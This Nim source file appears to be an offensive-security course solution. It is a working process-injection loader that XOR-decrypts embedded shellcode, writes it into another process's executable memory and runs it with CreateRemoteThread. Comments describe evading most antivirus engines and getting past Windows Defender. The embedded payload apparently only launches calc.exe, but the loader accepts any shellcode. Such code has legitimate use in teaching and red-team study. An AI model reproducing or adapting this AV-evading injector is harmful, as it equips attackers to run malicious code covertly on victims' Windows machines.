import winim/lean

# Base code taken from Exercise 2, refer there if anything is unclear

# While there is a lot more evasion to do here, this example bypasses most AV (1/26 on antiscan.me)
# In its current form, it IS detected by Windows Defender
# However, changing the shellcode to a larger one will get rid of this detection (for some reason)
# Alternatively, refer to the example solution of Bonus Exercise 3 for an example that does not get detected statically (for now)

# Helper function to XOR our shellcode to a byte seq
proc xorByteSeq*(input: openArray[byte], key: int): seq[byte] {.noinline.} =
    let length = input.len
    var k = key
    result = newSeq[byte](length)
    for i in 0 ..< result.len:
        result[i] = uint8(input[i]) xor uint8(k)

proc injectShellcode[I, T](shellcode: array[I, T]): void =
    let processId: DWORD = 8520
    
    let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, processId)
    defer: CloseHandle(pHandle)
    # We get rid of static strings to decrease our footprint 

    let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)

    # Decrypt our shellcode before writing it
    var decryptedShellcode = xorByteSeq(shellcode, 0x37)

    var bytesWritten: SIZE_T
    discard WriteProcessMemory(pHandle, rPtr, decryptedShellcode[0].addr, cast[SIZE_T](decryptedShellcode.len), addr bytesWritten)

    let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
    defer: CloseHandle(tHandle)

when defined(windows):
    # Define our encrypted shellcode
    # I re-formatted the output from the 'Encrypt.cs' C# solution example, since string formatting in Nim is a pain :)
    const shellcode: array[296, byte] = [
        byte 0xcb, 0x7f, 0xb4, 0xd3, 0xc7, 0xdf, 0xf7, 0x37, 0x37, 0x37, 0x76, 0x66, 0x76, 0x67, 0x65,
        0x66, 0x61, 0x7f, 0x06, 0xe5, 0x52, 0x7f, 0xbc, 0x65, 0x57, 0x7f, 0xbc, 0x65, 0x2f, 0x7f,
        0xbc, 0x65, 0x17, 0x7f, 0xbc, 0x45, 0x67, 0x7f, 0x38, 0x80, 0x7d, 0x7d, 0x7a, 0x06, 0xfe,
        0x7f, 0x06, 0xf7, 0x9b, 0x0b, 0x56, 0x4b, 0x35, 0x1b, 0x17, 0x76, 0xf6, 0xfe, 0x3a, 0x76,
        0x36, 0xf6, 0xd5, 0xda, 0x65, 0x76, 0x66, 0x7f, 0xbc, 0x65, 0x17, 0xbc, 0x75, 0x0b, 0x7f,
        0x36, 0xe7, 0xbc, 0xb7, 0xbf, 0x37, 0x37, 0x37, 0x7f, 0xb2, 0xf7, 0x43, 0x50, 0x7f, 0x36,
        0xe7, 0x67, 0xbc, 0x7f, 0x2f, 0x73, 0xbc, 0x77, 0x17, 0x7e, 0x36, 0xe7, 0xd4, 0x61, 0x7f,
        0xc8, 0xfe, 0x76, 0xbc, 0x03, 0xbf, 0x7f, 0x36, 0xe1, 0x7a, 0x06, 0xfe, 0x7f, 0x06, 0xf7,
        0x9b, 0x76, 0xf6, 0xfe, 0x3a, 0x76, 0x36, 0xf6, 0x0f, 0xd7, 0x42, 0xc6, 0x7b, 0x34, 0x7b,
        0x13, 0x3f, 0x72, 0x0e, 0xe6, 0x42, 0xef, 0x6f, 0x73, 0xbc, 0x77, 0x13, 0x7e, 0x36, 0xe7,
        0x51, 0x76, 0xbc, 0x3b, 0x7f, 0x73, 0xbc, 0x77, 0x2b, 0x7e, 0x36, 0xe7, 0x76, 0xbc, 0x33,
        0xbf, 0x7f, 0x36, 0xe7, 0x76, 0x6f, 0x76, 0x6f, 0x69, 0x6e, 0x6d, 0x76, 0x6f, 0x76, 0x6e,
        0x76, 0x6d, 0x7f, 0xb4, 0xdb, 0x17, 0x76, 0x65, 0xc8, 0xd7, 0x6f, 0x76, 0x6e, 0x6d, 0x7f,
        0xbc, 0x25, 0xde, 0x60, 0xc8, 0xc8, 0xc8, 0x6a, 0x7f, 0x8d, 0x36, 0x37, 0x37, 0x37, 0x37, 
        0x37, 0x37, 0x37, 0x7f, 0xba, 0xba, 0x36, 0x36, 0x37, 0x37, 0x76, 0x8d, 0x06, 0xbc, 0x58,
        0xb0, 0xc8, 0xe2, 0x8c, 0xd7, 0x2a, 0x1d, 0x3d, 0x76, 0x8d, 0x91, 0xa2, 0x8a, 0xaa, 0xc8,
        0xe2, 0x7f, 0xb4, 0xf3, 0x1f, 0x0b, 0x31, 0x4b, 0x3d, 0xb7, 0xcc, 0xd7, 0x42, 0x32, 0x8c,
        0x70, 0x24, 0x45, 0x58, 0x5d, 0x37, 0x6e, 0x76, 0xbe, 0xed, 0xc8, 0xe2, 0x74, 0x0d, 0x6b,
        0x40, 0x5e, 0x59, 0x53, 0x58, 0x40, 0x44, 0x6b, 0x44, 0x4e, 0x44, 0x43, 0x52, 0x5a, 0x04,
        0x05, 0x6b, 0x54, 0x56, 0x5b, 0x54, 0x19, 0x52, 0x4f, 0x52, 0x37 ]

    when isMainModule:
        injectShellcode(shellcode)